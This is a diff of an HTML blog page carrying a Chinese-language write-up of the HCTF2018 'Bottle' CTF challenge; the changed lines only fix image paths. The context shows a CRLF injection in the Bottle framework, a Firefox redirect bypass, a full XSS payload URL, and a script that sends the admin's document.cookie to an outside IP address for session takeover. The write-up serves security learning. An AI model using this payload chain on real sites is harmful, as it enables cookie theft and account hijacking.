@@ -30,18 +30,18 @@
 <meta property="og:site_name" content="Shadow Gallery">
 <meta property="og:description" content="HCTF2018 bottle writeup.">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://srpopty.github.io/.io//4V@3FC@51J0E9XXG-1024x269.png">
-<meta property="og:image" content="https://srpopty.github.io/.io//TIM%E6%88%AA%E5%9B%BE20181112190926-1024x547.png">
-<meta property="og:image" content="https://srpopty.github.io/.io//TIM%E6%88%AA%E5%9B%BE20181112191129-1024x280.png">
-<meta property="og:image" content="https://srpopty.github.io/.io//U5Z7A0TGDGISN5ZXKH_J.png">
-<meta property="og:image" content="https://srpopty.github.io/.io//TIM%E6%88%AA%E5%9B%BE20181112193243.png">
-<meta property="og:image" content="https://srpopty.github.io/.io//TIM%E6%88%AA%E5%9B%BE20181112193331-1024x384.png">
+<meta property="og:image" content="https://srpopty.github.io/HCTF2018-Bottle-Writeup/4V@3FC@51J0E9XXG-1024x269.png">
+<meta property="og:image" content="https://srpopty.github.io/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112190926-1024x547.png">
+<meta property="og:image" content="https://srpopty.github.io/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112191129-1024x280.png">
+<meta property="og:image" content="https://srpopty.github.io/HCTF2018-Bottle-Writeup/U5Z7A0TGDGISN5ZXKH_J.png">
+<meta property="og:image" content="https://srpopty.github.io/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112193243.png">
+<meta property="og:image" content="https://srpopty.github.io/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112193331-1024x384.png">
 <meta property="article:published_time" content="2018-11-12T12:23:58.000Z">
 <meta property="article:modified_time" content="2020-08-11T08:44:44.331Z">
 <meta property="article:author" content="Srpopty">
 <meta property="article:tag" content="WriteUp">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://srpopty.github.io/.io//4V@3FC@51J0E9XXG-1024x269.png">
+<meta name="twitter:image" content="https://srpopty.github.io/HCTF2018-Bottle-Writeup/4V@3FC@51J0E9XXG-1024x269.png">
 
 <link rel="canonical" href="https://srpopty.github.io/2018/11/12/HCTF2018-Bottle-Writeup/">
 
@@ -229,9 +229,9 @@
         <h1 id="Bottle"><a href="#Bottle" class="headerlink" title="Bottle"></a>Bottle</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Not hard, I believe you are the lucky one!</span><br><span class="line">hint1: *&#x2F;3 *&#x2F;10 </span><br><span class="line">hint2: bot use firefoxDriver</span><br><span class="line">URL http:&#x2F;&#x2F;bottle.2018.hctf.io</span><br></pre></td></tr></table></figure>
 
 <p>后端是个python，根据题目可知这个应用使用了bottle框架开发。应用功能是提交一个网址，但是经过测试发现不管提交什么网址都没有任何反应，目测可能只能提交本域名下的网址。</p>
-<p>登录与注册的时候发现中间经过了一个path跳转<br><img src="/.io//4V@3FC@51J0E9XXG-1024x269.png"></p>
-<p>bottle框架比较出名一点的漏洞是HTTP头注入漏洞(CVE-2016-9964)<br><img src="/.io//TIM%E6%88%AA%E5%9B%BE20181112190926-1024x547.png"></p>
-<p>在path跳转时可进行CRLF注入<br><img src="/.io//TIM%E6%88%AA%E5%9B%BE20181112191129-1024x280.png"></p>
+<p>登录与注册的时候发现中间经过了一个path跳转<br><img src="/HCTF2018-Bottle-Writeup/4V@3FC@51J0E9XXG-1024x269.png"></p>
+<p>bottle框架比较出名一点的漏洞是HTTP头注入漏洞(CVE-2016-9964)<br><img src="/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112190926-1024x547.png"></p>
+<p>在path跳转时可进行CRLF注入<br><img src="/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112191129-1024x280.png"></p>
 <p>所以思路是利用CRLF注入，将XSS内容写入到body中，将这个网址提交给管理员，管理员访问这个网址，触发XSS达到cookie</p>
 <p>这里有一个问题:当浏览器发现Location可以跳转时，将不会对body中的HTML进行渲染而直接跳转，只有Location为空时才不会跳转。但是此题中Location又不能为空(会500)，因此当管理员访问这个网址时肯定会跳转。不过Hint中提到”bot use firefoxDriver”，而在FireFox中，当Location目标网址的端口小于80时不会对Location跳转</p>
 <p>因此构造网址如下</p>
@@ -240,15 +240,15 @@
 <p>注意到题目中还设置了CSP</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</span><br></pre></td></tr></table></figure>
 <p>后来出题人再修复此题之后将CSP放在了CRLF注入点的下面，这样就可以直接把CSP挤到body中，浏览器便不会解析CSP</p>
-<p>在本地FireFox中测试<br><img src="/.io//U5Z7A0TGDGISN5ZXKH_J.png"><br>这里不使用alert测试是因为当URL中存在引号或括号时会500</p>
+<p>在本地FireFox中测试<br><img src="/HCTF2018-Bottle-Writeup/U5Z7A0TGDGISN5ZXKH_J.png"><br>这里不使用alert测试是因为当URL中存在引号或括号时会500</p>
 <p>于是将script的src指向自己服务器的js文件即可任意XSS，最终payload如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io&#x2F;path?path&#x3D;http:&#x2F;&#x2F;bottle.2018.hctf.io:0&#x2F;%0A%0D%0A%0D%3Cscript+src&#x3D;http:&#x2F;&#x2F;srpopty.cn&#x2F;1.js%3E%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure>
 
 <p>1.js</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ajax=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">ajax.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://123.206.86.208/xss/&quot;</span>+<span class="built_in">document</span>.cookie,<span class="literal">true</span>);</span><br><span class="line">ajax.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">ajax.send();</span><br></pre></td></tr></table></figure>
 
-<p>拿到管理员的cookie<br><img src="/.io//TIM%E6%88%AA%E5%9B%BE20181112193243.png"></p>
-<p>修改cookie登录拿到flag<br><img src="/.io//TIM%E6%88%AA%E5%9B%BE20181112193331-1024x384.png"></p>
+<p>拿到管理员的cookie<br><img src="/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112193243.png"></p>
+<p>修改cookie登录拿到flag<br><img src="/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112193331-1024x384.png"></p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p>
 
     </div>
